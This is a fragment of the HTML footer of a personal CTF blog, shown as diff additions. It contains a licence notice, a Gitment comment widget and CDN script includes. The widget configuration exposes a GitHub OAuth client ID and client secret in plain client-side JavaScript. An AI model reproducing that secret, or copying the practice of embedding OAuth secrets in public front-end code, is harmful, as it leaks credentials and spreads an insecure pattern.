+<strong>本文链接：</strong><a href="https://ctfer-stao.github.io/posts/7f9d86d3.html" title="https:&#x2F;&#x2F;ctfer-stao.github.io&#x2F;posts&#x2F;7f9d86d3.html" target="_blank" rel="noopener">https:&#x2F;&#x2F;ctfer-stao.github.io&#x2F;posts&#x2F;7f9d86d3.html</a><br>
+
+  <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+
+</div>
+
+
+  
+  <section class="nexmoe-comment">
+    <div id="gitment"></div>
+<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
+<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
+<script>
+var gitment = new Gitment({
+    owner: 'ctfer-Stao', // 你的 GitHub ID
+    repo: 'ctfer-Stao.github.io', // 存储评论的 repo
+    oauth: {
+        client_id: '87bde7b021d7f2e999b9', // 你的 client ID
+        client_secret: '7dfe317168fa1f007eb1b78bef98ab7b1c829272' // 你的 client secret
+    },
+})
+gitment.render('gitment')
+</script>
+</section>
+</div>
+    </div>
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/js/mdui.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+ 
+    <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+
+ 
+    <script src="https://cdn.jsdelivr.net/npm/smoothscroll-for-websites@1.4.9/SmoothScroll.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+<script src="/js/app.js?v=1578122598004"></script>
+<script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
+
+
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/xtaodada/xtaodada.github.io@0.0.2/copy.js"></script>
+
+
+
+  
+
+
+
+
+
+</body>
+
+</html>
